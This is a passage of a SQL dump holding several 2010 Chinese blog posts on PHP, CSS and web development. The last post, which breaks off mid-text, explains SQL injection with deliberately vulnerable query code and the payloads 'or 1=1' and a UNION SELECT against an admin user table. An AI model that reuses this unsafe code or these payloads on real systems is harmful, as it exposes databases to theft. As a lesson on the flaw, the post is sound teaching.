</p>\r\n<P>而paperen我又记得那次面试时那个经理问我MVC的问题，他对这方面还是有点了解但是了解不深，他问我“使用MVC与不是用MVC开发有什么区别么？是不是会导致网站速度降低”，这个paperen当时的回答是“速度上应该是不会有什么差异的”（除非都没有使用缓存文件的功能），相反不一定说使用MVC就比不适用MVC快，但是使用MVC就是有利于以后的维护也有利于开发。其实现在paperen我还是不知道我的回答是不是对的。或许以后的一天会有更深刻的了解吧。 </p>\r\n<P>paperen我始终不认为事情的发展是有必然的关系，正如你学习MVC那样，对于一个php开发人员来说，你可以不去使用MVC去开发网站程序，只是你会比较累一点，但是你并不会觉得没有意思，不会妨碍你展开你美好的网站开发生涯，不过~~可能到最后你还是要学习它，使用它，因为你热爱开发，热爱你所写的代码，你想让网站的布局还有代码完美得像一首诗，不然怎会有人说“Code is Poetry”。 </p>\r\n<P>维基---MVC <A href="http://zh.wikipedia.org/wiki/MVC"></p>http://zh.wikipedia.org/wiki/MVC</A><P></p>\r\n<P>百度百科--MVC <A href="http://baike.baidu.com/view/31.htm">http://baike.baidu.com/view/31.htm</A></p></p>', 2, 1, 1006, 0, 1, 0, 1270316094, 0),
(43, '岁月的童话', 'only-yesterday', 1, '<P>其实是不想起这么深奥的一个标题的，但是此时此刻在听着罗嘉良的这首歌，记得这是以前翡翠台那部叫流金岁月电视剧的主题曲，paperen我最喜欢一开始口哨这段，听着这个旋律真的让我觉得岁月在流逝，还有想起了以前那些珍贵的时刻。 </p>\r\n<P>今天确实点累了，好不容易才到了周末，本来下午也开始放假的，但是还是选择在公司度过，开发部的人员都在，他们都好勤奋，或者说做技术的都是这样吧。感觉paperen的工作已经开始慢慢上轨，这周也完成了几个分任务而目前还有一个个人项目在做。而这七天来paperen貌似都在重复一个节奏，生活貌似确实是很单调，下班了回来就是对着四面墙。 </p>\r\n<P>paperen我真的是很难给自己定义一个生活标准，也很难去改变什么，即使明明觉得单调但是还继续这样下去，改变自己这个动作在我的字典中好像就是不存在，无聊的时候对着镜子看着里面的那个自己，paperen我是想成为一个综合能力很强的web developer，想做很多很多好的网站，这些就是我想到的目标了，程序员能做一辈子么？写代码能写一辈子么？你是不是会这样问我，其实paperen的答案也是不知道，虽然paperen听得出如果你这样问我的意思是说程序员不能做一辈子，但是我也没说自己会当一辈子程序员嘛，paperen只是想成为一个综合能力强的网站开发者。 </p><!--more-->\r\n<P>妈妈与叔叔都说要赚钱还是要自己出来做啊，自己搞自己的公司，但是创业这个词在我脑中就是空空的，貌似paperen我不是那种善于发掘与创业的人，至少目前paperen我没有什么创业的念头。目前只是一心想提升自己的技能。 </p>\r\n<P>今晚与习技团队中的一个孩子聊天，他老是说我这种待遇在广州不行，他说1500在广州怎买房，3000也不行啊，paperen我到底也没想过在广州买房……现在为什么我满脑子都是想着怎样去完成主管布置我的那个项目，我没想到自己的工资应该怎样翻倍地增长，待遇应该怎样更好，当然目前paperen还是想着去住小区，但是给自己换一个更好的居住环境所需要的物质上的支持以现在的我来说是不可能的，或许这也可以成为自己的一个奋斗理由。 </p>\r\n<P>那个孩子说自己以后的待遇要怎么样的好，说要么就不做，一做就要做最好的，要当一个架构师，年薪过万的，这样的理想也挺不错，但是是不是说一开始就能做架构师，一开始就能做到最好，paperen我无权去否决一个人的理想，因为自己的理想也是很弱智的，而当你有了一个理想后就会有了另一种生活观，你会在生活中去完善你这种生活观并有了一个意识，你应该去做什么不应该去做什么。或许paperen在这里想说的只是说明自己也是一个没有对错之分的人。 </p>\r\n<P>8点50离开出租屋，走出那条七天来都是又脏又湿的小巷，经过人来人往的小街道，然后晚上都是到同一家饭店吃同一个菜式，晚上7点半左右再经过人来人往的小街道，走进那条七天来都是又脏又湿的小巷，回到四面墙的出租屋里面……生活是那样的简单，快乐来源于什么？你能告诉我么？除了将所有贡献在工作上你还能够做些什么？自己的兴趣确实是网站开发，但是你能告诉我我目前的工作不是程序员么？ </p>\r\n<P>此时此刻的paperen并不是怀着某种悲伤或者迷惑的心情去写这篇东西的，只是当我听着这段口哨声不知不觉地开始怀念小时候画画的心情，怀念那时候与爷爷一起去摘鸡蛋花的情景，怀念自己弹琴的心情，怀念自己踢球的心情……那些不会被重复的心情，好像就是唯一的感觉，好像自己的心情也还是那么的平静，但是此时就是有点感触。 </p>\r\n<P>paperen我是不会不开心的，只是有时候会有想哭的冲动，比如当自己第一天下班回到出租屋看着屋内四面墙的时候，当自己想起与死党们踢球的时候，当自己写着这篇文章的时候……或许许多事情是没有目的的，自己貌似能看透一切但是还是得接受一切。 </p>\r\n<P>我想岁月这个名词貌似就已经很深奥，一个人能将岁月理解透了也真的不容易了，不知道大家对岁月这个词有什么感觉，反正paperen觉得自己会用岁月的童话中的这段口哨声代替我对这个词的形容吧。</p></p>', 2, 1, 1013, 1, 0, 0, 1270921871, 0),
(44, 'IP To Location', 'ip-to-location', 2, '<P>IP to location就是ip地址转为实际地址啦，近来paperen在公司的一个任务是做一个叫防同行的插件，其实就是实现网站屏蔽被某个地区ip或者城市，甚至是国家的人浏览的功能，在网页中放上一个script的调用就可以，在这个项目中paperen终于体会到大数据量的数据库是怎样一回事……嗯……多余的就不说太多了，直接说这个iptolocation算啦。(声明一下这篇文章的IP to location并不是在公司那个项目所使用的技术) </p>\r\n<P>今天为博客加上了一个接口，功能只是来获得浏览者的所在地，这个接口的实现主要难在实现ajax跨域，而数据主要是使用了www.webxml.com.cn的webservices来获得，它的接口的地址是</p><P><A href="http://www.webxml.com.cn/WebServices/IpAddressSearchWebService.asmx/getCountryCityByIp?theIpAddress=127.0.0.1">http://www.webxml.com.cn/WebServices/IpAddressSearchWebService.asmx/getCountryCityByIp?theIpAddress=127.0.0.1</A></p><!--more--><P>我们要做的就是更改其中theipaddress参数吧，你可以直接访问看看，是一个xml的文档。 </p>\r\n<P>其实自己这个东西也研究了两天，一开始做了一个，之后发觉不能跨域访问，然后今天再查了一些资料，并解决了跨域的问题，而这回就真的可以使用了。关于paperen这个东西，您可以访问这个页，如果想借用一下也是可以的。 </p>\r\n<P><A href="http://iamlze.cn/demo/ip2location/">插件引用文档及例子 </A></p>\r\n<P>还先放出在paperen研究过程中参考了哪些文档。</p>\r\n<P>csdn论坛的帖子：<A href="http://topic.csdn.net/u/20090508/13/aceaa87a-8b5e-44cb-8ebf-1cbd0b8d53ff.html">http://topic.csdn.net/u/20090508/13/aceaa87a-8b5e-44cb-8ebf-1cbd0b8d53ff.html</A></p>\r\n<P>javaeye：<A href="http://www.javaeye.com/topic/260647">http://www.javaeye.com/topic/260647</A></p>\r\n<P>jquery手册：<A href="http://jquery-api-zh-cn.googlecode.com/svn/trunk/index.html">http://jquery-api-zh-cn.googlecode.com/svn/trunk/index.html</A></p>\r\n<P>php手册：<A href="http://cn2.php.net/manual/en/function.file.php">http://cn2.php.net/manual/en/function.file.php</A></p>\r\n<P>json_encode函数：<A href="http://iamlze.cn/demo/json_func/">http://iamlze.cn/demo/json_func/</A> </p>\r\n<P>如果是你的话，你会怎去实现这个功能？ </p>\r\n<P>对于paperen来说，我是这样想的，因为现在已经有了webxml提供的数据，你要做的就是实现自动获得浏览者的ip然后传送到webxml.com.cn这个接口上，然后获得它的回传数据，并分析数据然后重新组织成你希望的数据，核心技术就是这样，而对于调用的时候肯定是需要用上ajax的了，当然如果你这个插件只是用在自己网站的话根本就不需要考虑跨域的问题，但是要想别人也可以使用你的插件的话你就必须解决跨域的问题，而paperen在查阅了一些资料后就用上了$.getJSON去解决这个问题。 </p>\r\n<P>这个paperen在弄这个小东西时的整个流程。下面来看看具体的。 </p><PRE>if(isset($_SERVER[''REMOTE_ADDR''])){\r\n<P>  $url = "http://www.webxml.com.cn/WebServices/IpAddressSearchWebService.asmx/getCountryCityByIp?theIpAddress=";<br />  $client_ip = $_SERVER[''REMOTE_ADDR''];<br />  $lines = file($url.$client_ip);<br />  $data = "";<br />  foreach($lines as $l =&gt; $line){<br />   $data .= $line;<br />  }<br />  $tmp = explode("", $data);<br />  $yourip = $client_ip;<br />  $from = str_replace(array("",""), '''', $tmp[2]);<br />  $ipinfo = array(''ip'' =&gt; $client_ip, ''from'' =&gt; $from);<br /> }else{<br />  $ipinfo = array(''ip'' =&gt; ''未知'', ''from'' =&gt; ''地球某处的…'');<br /> }<br /> $jsoncallback = isset($_GET[''jsoncallback'']) ? $_GET[''jsoncallback''] : '''';<br /> echo $jsoncallback."(".json_encode($ipinfo).")";</p></PRE><P>使用S_SERVER[''REMOTE_ADDR'']获得对方的ip地址数据，然后放到url中使用file获得这个页面的数据，并重组。之后开始分割数据，而这里自己弄的比较傻，因为对于这样一个xml数据。</p>\r\n<P><a href="http://localhost/paperenblog/file/66" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/66" alt="201004181271599201" title="上传于2010-04-18"></a></p>\r\n<P>我们要获得两个数据，一个是第一个被包着的ip地址，第二个也是被包着的地址数据，而自己使用了explode对进行了分割，然后再硬性地将一些字符替换掉，于是乎就得到了我们想要的数据……这里的方法仅供参考。 </p>\r\n<P>最后用json_encode对数据进行json的转换，如果php版本不自带这个函数的话，需要手动加上，paperen我也放出来给大家了，也是自己以前在网上找的。但是这里这个需要注意一下jsoncallback这个变量，这个就是用来回传给getJSON的数据的钩子，也是重点之处。不然会接收不到数据的。你看看javaeye中那篇文章就应该会明白了，而jquery中是怎样实现的，这里就不管了，那可能也是一个很复杂的问题吧。</p>\r\n<P><a href="http://localhost/paperenblog/file/67" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/67" alt="201004181271599885" title="上传于2010-04-18"></a> </p>\r\n<P>而js文件就就根本没什么东西的啦。</p><PRE>$(function(){<br /> $.getJSON("http://iamlze.cn/plugins/ip2location/?jsoncallback=?", function(data){<br />  var str = "我猜您是来自"+data.from+"的";<br />  $("#ip").html(str);<br /> });<br />});</PRE><P>传回来的data是一个对象，而你要做的就是获得数据中名为from的数据，所以直接data.from就是了，然后定义一个放置数据的容器，这里paperen硬性地定义了一个叫ip的容器用来放置数据。 </p>\r\n<P>至于如果大家想调用的话看看那个文档就会了，其实真的没太多东西。而想起来其实真的好像不用实现对数据分割的吧，获得ip后直接送到webxml那边去处理再将整个xml数据交给js处理就可以了，貌似自己又SB了……不要紧了已经不是第一次了……大家应该能体谅的，或者自己去整个比我这个更爽的，对了还可以弄个天气预报的，嘻嘻，google有weather接口的。</p></p>', 2, 1, 927, 1, 0, 0, 1271603223, 0),
(45, '一个上传文件的Class', 'upload-class', 2, '<P>今天终于算是可以来更新一下paperen的网站，嗯……因为写毕设论文写累了所以就发表一篇关于上传文件类的东东吧，这个类也是自己写的，不知道对大家有没有用，如果觉得可以就拿去用吧。不过在编码上面还是没做好，自己是在utf8的页面将数据进行提交的，所以生成的文件如果保持原来的中文名字的话在文件夹中看到就是乱码的名字，如果不想出现乱码的话需要进行一下编码的转换。 </p>\r\n<P><A href="http://iamlze.cn/demo/fileuploadclass/">代码地址 </A></p>\r\n<P>随便说下这个类怎样调用吧，方法很简单 </p><!--more--><PRE>$dir = ''upload/'';<br />require("upload_class.php");<br />$u = new file_uploader;<br />$u-&gt;ready($dir, $_FILES[''upload_file''], false, false, true, 0);<br />echo $u-&gt;do_upload();</PRE><P>就像N年前那个染头发的广告说的那句，“得左！染黑头发就是这么简单！”一样，这里上传文件的操作也是“上传文件就这么简单！”。当然那个$_FILES[''upload_file'']是对应表单中的file类型的控件的名字。而需不需要在上传后输出提示就看你自己啦，关于参数在代码那里面有详细说明，不过这里也是放出来吧。 </p>\r\n<P>ready方法的参数说明：</p>\r\n<P>第一个参数$dir 为上传文件存放的路径<br />第二个参数为$_FILES 为你那个上传文件变量<br />第三个参数允许文件大小 单位为MB<br />第四个参数允许的文件类型 格式为jpg|png|gif<br />第五个参数是否需要生成新的文件名<br />第六个参数为返回的提示格式 0为直接提示上传正确 1则返回一个数组array(''filename'' =&gt; 上传的文件名字, ''filesize'' =&gt; 文件大小, ''tip'' =&gt; 成功上传); </p>\r\n<P>很好！这样就完成了一篇文章，不过也花了不少时间呢…… </p>\r\n<P>哎~确实也很久没发表文章了，而懒吧的域名到期了，空间也快到期了，哎~还说要给懒吧换脸结果还是没有做到，坚持一些东西确实很难，26岁之前能将懒吧坚持下去么？我也开始怀疑了，买域名买空间都要钱，不过可能可以借习科的空间用用，但是也得自己有空弄的时候再说吧……而在诺网这差不多两个月的实习过程中，paperen确实又产生了不少念头，开始有点计划。 </p>\r\n<P>不知道大家有没有浏览过zcool这个网站，paperen也经常去挖zcool这个网站上的一些素材，原则上它是一个分享设计素材的网站，网站吸引着大量优秀的设计者，当然也吸引着像paperen我这样的专门喜欢挖素材的，除此之外还充满着机会，说不定某个开发主管欣赏上你的作品就会邀请你参与他们公司的开发项目为其设计，paperen看zcool的网站真的发展得挺不错的，现在都出杂志了，所有素材都是免费而且很有质量，正是这样才能有生命力，paperen想这个网站的幕后人员肯定也不简单吧。 </p>\r\n<P>然后觉得能不能弄个代码的网站，例如叫zcode，上天请允许paperen在此刻YY一下……不过你想嘛，设计的东西都是可以放出来看的，至于代码嘛……额，就是一大堆的……或许大家关心的只是代码执行后的作用，所以要让这个所谓的zcode网站充满活力最好就是能有代码演示功能，对于JavaScript的代码当然是可以运行，但是如果代码是动态语言的呢？难点也在这里了。paperen发觉目前的源码共享网站都是让大家下载的，而大部分都是以文章的形式发表，不过代码确实是与设计很不同，从想象到实践确实有很大的一段路程，paperen会将这个萌生的念头仔细量度后才有动手的理由，而且那需要时间，paperen真的不想成为一个满脑子都是计划但是没有一个计划能兑现的人。 </p>\r\n<P>还有开始觉得要为自己的网站改版了，这种风格都看腻了……从此自己脑中又堆积了一条新计划，而这个计划的期限是……让你来猜好了……</p></p>', 2, 1, 995, 1, 0, 0, 1274022893, 0),
(46, '两个Correcting Orphans的方法', 'two-ways-correcting-orphans', 3, '<P>哇塞！看到这个题目或许就让人糊涂……连paperen自己都看不懂是什么意思，“更正孤儿”其实这是一个关于css布局的问题，例如你想做一个效果是，左边是一张小图片右边是一堆文字，就是半图半字的布局，那么这篇或许正是你需要的。 </p>\r\n<P>在paperen琢磨自己新设计的皮肤时，也抽点空先尝试一下设计图中一些布局中的css技巧，而也正是有使用这个布局的地方，而在sohtanaka的博客那也找到了一篇关于这个css技巧的文章，而文章名字就是Correcting Orphans，paperen所以在这里也用了这个名字，所谓站在巨人肩膀上嘛~~ </p>\r\n<P>解决方法1：sohtanaka说的 </p><!--more-->\r\n<P>sohtanaka的博文连接为：<A href="http://www.sohtanaka.com/web-design/css-overflow-property-quick-tip/">http://www.sohtanaka.com/web-design/css-overflow-property-quick-tip/</A></p>\r\n<P>自己做的例子为：<A href="http://iamlze.cn/demo/correcting-orphans/ ">http://iamlze.cn/demo/correcting-orphans/ </A></p>\r\n<P>大家可以先看下他写的。下图为一个例子。 </p>\r\n<a href="http://localhost/paperenblog/file/68" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/68" alt="201005301275150809" title="上传于2010-05-30"></a> \r\n<P>显然这个并不是我们想要得到的效果，左边还有文字，并且是在右边的文字高度高于左边的图片是就会自动将多余的内容放到左图的下方。而我们想要的效果就是左边与右边独立开，左图右字。 </p>\r\n<P>他举得例子的html结构：</p><P><PRE>&lt;img src="your_image.jpg" class="thumb" /&gt;<br />&lt;div class="description"&gt;<br />    &lt;h3&gt;Heading 1&lt;/h3&gt;<br />    &lt;p&gt;Paragraph goes here...&lt;/p&gt;<br />    &lt;p&gt;Paragraph goes here...&lt;/p&gt;<br />&lt;/div&gt;</PRE><P>css:</p><PRE>.thumb {<br />    float: left;<br />    margin: 5px 20px 20px 0;<br />    padding: 5px;<br />    border: 1px solid #ccc;<br />    background: #f0f0f0;<br />}<br />.description {overflow: hidden;}<br /></PRE><P>而paperen在看了他的解决办法后觉得有点疑惑的是，要将右边的区块加上overflow: hidden;实在有点想不通，设置溢出为隐藏为什么就将本来跨到左边来的字乖乖地回到右边，嗯……实在想不明白其中的原理，这个要问写浏览器的那个程序员么……算了，就当是一个css技巧，记住吧。 </p>\r\n<P>不过有看他这篇文章评论的人会发觉其中有个叫webangel78人说“Unfortunately it does’t work in IE6.”哎……又是可恶的ie6。而之后sohtanaka又放出ie6下的解决办法。 </p><PRE>*html .description {float: left;}</PRE><P>换言之完整的css代码为：</p><PRE>.thumb {<br />    float: left;<br />    margin: 5px 20px 20px 0;<br />    padding: 5px;<br />    border: 1px solid #ccc;<br />    background: #f0f0f0;<br />}<br />.description {overflow: hidden;}\r\n*html .description {float: left;} </PRE><P><a href="http://localhost/paperenblog/file/69" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/69" alt="201005301275151985" title="上传于2010-05-30"></a> </p>\r\n<P>解决办法2：smashingmagazine网站已经有现成的结构，不过没有提到是如何实现的 </p>\r\n<P><a href="http://localhost/paperenblog/file/70" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/70" alt="201005301275152110" title="上传于2010-05-30"></a></p><P>好在paperen记忆力还算不错，记得这个网站也有使用到这种布局，所以又上这个网站研究一下，想看看他的实现是不是与sohtanaka说的一样。 </p>\r\n<P>使用firebug（Firefox浏览器的一个超BT的插件）或者opera中的开发者工具就可以研究所有网页甚至随意更改……所以才说BT。看到他的样式并不是如sohtanaka说的办法，嗯，又多了一种方法，多么兴奋，paperen又可以发表一篇文章了！真好……废话少说…… </p><P>html结构：</p><P><PRE>&lt;div class="container"&gt;<br /> &lt;div class="pic_thumb"&gt;<br />  &lt;img src="life.png" alt="" title="" /&gt;<br /> &lt;/div&gt;<br /> &lt;div class="entry"&gt;<br /> hello,i am paperen<br /> &lt;/div&gt;<br />&lt;/div&gt;<br /></PRE><P></p><P>css：</p><PRE>.container{<br /> width:500px;<br /> margin:5% auto;<br /> clear:both;<br /> height:auto;<br />}<br />.pic_thumb{<br /> float:left;<br /> padding:0px 10px 10px 10px;<br />}<br />.entry{<br /> line-height:1.7em;<br /> margin-left:162px;<br />}</PRE><P>对比于sohtanaka那个办法，这个办法兼容ie6，貌似也挺不错，而这个办法paperen倒是明白了，让左边包住图片的容器左浮动，从而理论上是脱离了整个container容器，而让装右边文字的容器离container的左距离刚好大于或等于左边pic_thumb的宽度，就行了。 </p>\r\n<P>不管怎样说，两个方法任选一个吧，都不错的，你自己看着办吧~~paperen个人喜欢第二种方法。</p></p>', 2, 1, 805, 1, 0, 0, 1275153315, 0),
(47, '关于网站打开速度那点事', 'about-the-speed', 4, '<P>最近paperen我主要是在做新的博客，当然也会与宿友们打打机，所谓好好利用剩下的大学时间嘛~~而新博客也差不多了，前台基本可以了，现在正在修理后台。而在重修程序与整改的过程中确实也会有不少收获与进步，比如站点的框架，还有站点的性能上。 </p>\r\n<P>而目前对于paperen而言，网站的性能主要是体现在站点打开速度上吧，固然这里说到的提升性能也只是程序上的方法，因为paperen对于服务器的配置真的接触得很少，什么图片与站点放在不同的服务器上，这种服务器上的部署paperen我就知道得很少了。所以如果您是想了解服务器方面提升站点性能知识的话，这篇东西应该就不是您所需的了，而此文章也不包括实际代码，或者以后会加上一些例子。 </p>\r\n<P>首先paperen我想问问各位对于网站速度慢有什么看法？一个打开非常慢的网站是不会受欢迎的，苛刻地形容，如果你的网站在3秒后才能打开浏览者可能在2秒的时候就会叉掉，或者在1秒的时候就会叉掉……每个浏览者都喜欢快感，你不要让他们等得太久，也不要期望他们会去等待3秒，哪怕是1秒，paperen现在的博客在宿舍的环境中（805Kbps，有几个人在玩网游，有一个人在看视频）打开首页需要5，6秒。额……paperen我也不知道会不会曾经有浏览者会因为这个而停止访问我的博客，不过5，6秒这个也确实有点慢了，所以计划在新博客中将速度提升一下或者弥补一下。我们要知道让浏览者等待一秒是什么概念，更不用说让他们再等待多一秒了。 </p><!--more-->\r\n<P>1.减少与数据库交互的次数从而提升速度</p>\r\n<P>传说中打开一个html页面比打开一个动态页面要快，其实也不能说是传说，那是肯定的，对于服务器而言在处理动态页面时是比处理静态页面时多了某些操作的，例如会去编译并解析动态页面中的一些脚本，而这些脚本可能会连接到数据库并获取一些数据，而连接数据库并获取数据花费的时间很可能就是占了等待时间的一半，固然对于一些数据量较大的网站首选的提升性能减低服务器压力的办法就是有针对地生成静态页。 </p>\r\n<P>减少与数据库交互次数也不是说要为每个页面生成静态页，有时候伪静态也是挺不错的选择，所以有时候我们会用到缓存文件，对于缓存的定位就是放在程序与数据库之间，或者他就是数据库部分数据的克隆体。对于站点一些配置文件或者一些很基本的设置可以考虑生成其缓存文件，而在程序中直接将其引入便可以使用，从而能减少与数据库交互的次数。但是对于缓存我们还要考虑生成或更新的触发点，对于一些由后台（管理员）才能修改或者添加的操作可以使用主动更新，就是说缓存文件的更新动作发生在我们添加或者修改后，而如果是一些基本的数据（不知道怎形容了……）可以选择由浏览者触发，就是当浏览者访问页面的时候让程序判断某个缓存文件的时间是否超过我们所定义的缓存时间，是则更新缓存文件。 </p>\r\n<P>2.图片加载</p>\r\n<P>曾经在浏览某些多图片网站，特别是购物网站，图片加载会占了大部分带宽，虽然这并不属于程序的问题，但是不能忽略这个问题的存在，为什么我们要让第一次加载页面的时候就将这个页面所有图片都进行加载，能不能让浏览器决定加载什么图片，也就是延迟加载技术，你有注意paipai网的话就能明白这个技术真的太好了。下面这个链接是牛人们写的代码。</p><P><A href="http://www.cnblogs.com/cloudgamer/archive/2010/03/03/ImagesLazyLoad.html">http://www.cnblogs.com/cloudgamer/archive/2010/03/03/ImagesLazyLoad.html</A></p><P>其次是页面样式中调用的图片，对于一些基本的图片元素可以考虑全部放在一张图片中，从而减少加载图片的次数与流量。这样说吧，如果你页面有三个图标</p>\r\n<P><a href="http://localhost/paperenblog/file/71" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/71" alt="201006111276222856" title="上传于2010-06-11"></a></p>\r\n<P>你将其做成三张图片，然后分别加载，这样占用的流量是这三张图片的大小加起来，但是如果你将三个图标放到一张图片中的话加载的话只是这张图片的大小，对于小量图标的时候确实是看不出问题所在，但是在图标多了之后就明显感觉到将图标都放在一张图片的好处了，我们可以使用背景的位置对图标进行分割显示（background-position）。</p><P>大家不妨看看这个（有啊的图片）<A href="http://co.youa.baidu.com/picture/r/mall/hp090617/images/sprites_hp.png">http://co.youa.baidu.com/picture/r/mall/hp090617/images/sprites_hp.png</A></p><P>3.页面分块显示技术</p><P>如果你的首页真的是需要查询比较多的数据，那么最好让你的页面能够分块显示，比较形象地形容这种技术就像我们宿舍那天到某饭馆吃饭一样，他们老是一个一个菜轮流上的，而不是一次上完……你让浏览者等了一段时间才会看到页面还不如让他们先看到部分页面，这样就能“钓着他们”了并不会让他们觉得你的网站出现了问题而让他白等。 </p>\r\n<P>4.模板语言的选用</p>\r\n<P>有没有使用模板语言，例如smarty，paperen觉得这个要根据你项目具体考虑了而不是都要用到，例如paperen这个博客，就觉得没有太多必要使用了，因为都是paperen设计页面与编写代码的，所以就没必要分得太细了，而且可能还会影响到速度，所以对于模板语言的使用大家还是有必要斟酌一下。 </p>\r\n<P>而关于更多web开发的高性能大家可以看看这里，“巨人们”都有很多这方面的方法与资料了。能站在巨人的肩膀上真是好啊~~ </p>\r\n<P><A href="http://www.cnblogs.com/BearsTaR/archive/2010/05/12/web_performance.html">http://www.cnblogs.com/BearsTaR/archive/2010/05/12/web_performance.html</A></p></p>', 2, 1, 1373, 2, 0, 0, 1276224010, 0),
(53, '传说中的SPL', 'legend-of-spl', 2, '<p>SPL，PHP 标准库（Standard PHP Library），paperen之前在《PHP高级程序设计：模式、框架与测试》一书中就见过这个词，但是那时貌似没有认真对待它，而今天paperen再重新查阅了spl相关的资料，证实了一样东西“值得一试并值得加以融入到以前的编码模式中”。放在前面，本文并不是要详说spl中的具体东西，而是纯属个人吹水……</p><p>可能您也没怎么了解有关spl的东西，但是建议您不妨查阅一下资料，在google输入php spl您会得到一些很吸引人的标题，比如“PHP SPL，遗落的宝石”，确实值得您浏览一番滴~~</p><p>”spl从 PHP 5.0 起内置的组件和接口，并且从 PHP5.3 已逐渐的成熟“，但目前spl貌似没怎被开发使用。当然啦，在使用spl之前还是得需要一定的代码基础，因为大部分都是与类或者接口打交道的，如果您连什么叫类都不是太清楚的话，相信阅读手册会可能会有点困难，您至少需要有些少oop（Object Oriented Programming）面向对象的基础。</p><!--more--><p>或者您可以先阅读一下这个<a target="_blank" href="http://www.tech-q.cn/redirect.php?tid=11044&amp;goto=lastpost">http://www.tech-q.cn/redirect.php?tid=11044&amp;goto=lastpost</a></p><p>里面也有一个好的例子说明了使用spl中的迭代器是如何方便简单，但是看完了之后确实会有“你可能会说，这不是花了更多的代码去办同一件事情吗？”，“不足矣‘诱惑你’去使用 SPL”这么一些想法……paperen也是。但是要明白这种编码是符合oop思想的，那个帖子中也说到“具有高度重用”，确实您可以写一两个函数去实现同样的功能，但是两者的编码思想是不同的，一个是oop另一个可能是oo（面向过程）。</p><p>而paperen在网上看到一篇很有趣的文章来说明了两种思想的某些区别。<a target="_blank" href="http://www.talentdigger.cn/home/space.php?uid=91&amp;do=blog&amp;id=889">http://www.talentdigger.cn/home/space.php?uid=91&amp;do=blog&amp;id=889</a></p><p>要明白当您的水平到达一个程度的时候您会开始想偷懒，您会开始觉得以前单个文件实现一种功能这种编码行为太可怕了，您会开始佩服自己以前的编码思路，甚至不想再看以前写的代码（比较极端）……您会开始想一些很奇怪的东西，例如我能不能让这个文件处理更多功能，能不能让某些代码不用每次都ctrl+v一遍，能不能简化一下代码，能不能在修改的时候少改点代码（那些又长又臭的代码）等等。或者您可以看看paperen之前写的一篇东西 <a target="_blank" href="http://iamlze.cn/archive/我是怎样编写网站代码的">http://iamlze.cn/archive/我是怎样编写网站代码的</a>，希望会对您产生一些共鸣。以下为paperen改进了一下那个例子的代码（读取某个路径下指定类型的文件）</p><pre>&lt;?php <br ?=""><br />define(''ROOT'', str_replace(''\\'', ''/'', dirname(dirname(__FILE__))));<br />define(''ALLOWEXT'', ''jpg|gif|png|php'');<br /><br />class my_filefilter extends FilterIterator<br />{<br />    protected  $_ext = array();<br />    public function  __construct($path) {<br />        parent::__construct(new RecursiveDirectoryIterator($path));<br />    }<br />    public function set_ext($ext) {<br />        $this-&gt;_ext = $ext;<br />    }<br />    public function get_ext() {<br />        return $this-&gt;_ext;<br />    }<br />    public function accept() {<br />        $item = $this-&gt;getInnerIterator();<br />        if ($item-&gt;isFile() &amp;&amp; in_array(pathinfo($item-&gt;getFilename(), PATHINFO_EXTENSION), $this-&gt;_ext)) return true;<br />    }<br />}<br /><br />$my_files = new my_filefilter(ROOT);<br />$my_files-&gt;set_ext(explode(''|'', ALLOWEXT));<br /><br />foreach ($my_files as $item) {<br />    print_r($item);<br />    echo PHP_EOL . $item-&gt;getFilename() . PHP_EOL;<br />}<br /><br />?&gt;</pre><p>ROOT这个常量就要根据您测试时修改吧，在实际使用过程中会固定的，这里为可允许后缀作了封装，而不是像上面url中那个例子那样直接固定在类中，我们可以根据自己的需求更改我们需要的文件类型，调用set_ext就可以了。<br /></p><p>paperen相信当你了解到一定程度你会发现spl的价值真的很大。</p><p>（ps：php手册里面的介绍也是比较详细的了，再分享一个带评论版的php手册的下载地址，<a target="_blank" href="http://www.installb.tk/post-23.html">http://www.installb.tk/post-23.html</a>，好东西来的）</p></p>', 2, 1, 789, 1, 0, 0, 1283248377, 0),
(54, '你是这样处理来自$_GET的数据吗', 'did-you-handle-the-datas', 2, '<p>最近看恶心代码太多了，也写了太多垃圾代码了……真是哦弥陀佛……感觉paperen变垃圾……</p><p>唉~~不多说了，直接开始正文算了。放代码，对比一下下面两个sql变量，然后入库查询，你觉得有问题么？</p><pre>$id = isset($_GET[''id'']) ? $_GET[''id''] : '''';<br />if ($id) {<br />	$sql = ''select * from goods where id=''.$id;<br />	echo $sql.''<br />'';<br />	<br />	$r_1 = $db-&gt;select($sql);<br />	print_r($r_1);<br />	<br />	echo ''----<br />'';<br />	<br />	$sql = "select * from goods where id=''$id''";<br />	echo $sql.''<br />'';<br />	<br />	$r_2 = $db-&gt;select($sql);<br />	print_r($r_2);<br />	<br />	echo ''----<br />'';<br />}<br /></pre><p>表面上看上去都是可以的，当test.php?id=1时输出sql这个变量都是一样的，但是如果我随意改变一下这个id呢？改为test.php?id=1 or 1=1，你就会看到区别了。<br /></p><!--more--><p>第一个$sql变为：select * from goods where id=1 or 1=1</p><p>第二个$sql变为：select * from goods where id=''1 or 1=1''</p><p>很明显当将前一个sql语句送入数据库后，都会查询出goods表中所有记录的，因为加上了or 1=1，也就是永远都是真的。而第二条sql则将1 or 1=1当为一个字符串与表中的id号匹配，由于mysql的机制会自动将这段字符串中前面数字部分进行匹配（确实这里会有点费解，其实与id=''1''是相同效果，不过这里的id字段必须是数字类型），所以这里的sql等同于“select * from goods where id=''1''”，所以还是查到id为1的数据。</p><p>而万恶之源也正是这样衍生出来的，特别是一些新手对于这种处理get数值的时候可能就会犯下错误。很明显地，第一句sql是对get过来的数据想都不想就直接与我们写好的一部分sql语句拼合起来，然后扔去给数据库处理，故会出现一些我们意想不到的结果，例如能查出这个表的所有数据还可以结合union等其他命令去注入我们的数据库（这种事情就是黑客所说的注入点）。如果我这个数据库中还有一个user表装的是管理员的登陆信息的话，这里事先告诉你user表有3个字段，分别是id，username，password，而goods表有9个字段。如果你用的第一种写法我们就有可能通过这里获得你管理员表的信息。</p><pre>sql1：select * from goods where id=1 union select 1,2,3,4,5,6,7,8,9 from user<p>sql2：select * from goods where id=''1 union select 1,2,3,4,5,6,7,8,9 from user''</p><p>sql1 result:</p><p>Array<br />(<br />    [0] =&gt; Array<br />        (<br />            [id] =&gt; 1<br />            [price] =&gt; 0.40<br />            [cost] =&gt; 1<br />            [name] =&gt; 香蕉<br />            [luckyprice] =&gt; 0.01<br />            [start] =&gt; 2010-09-15 09:02:05<br />            [end] =&gt; 2010-09-16 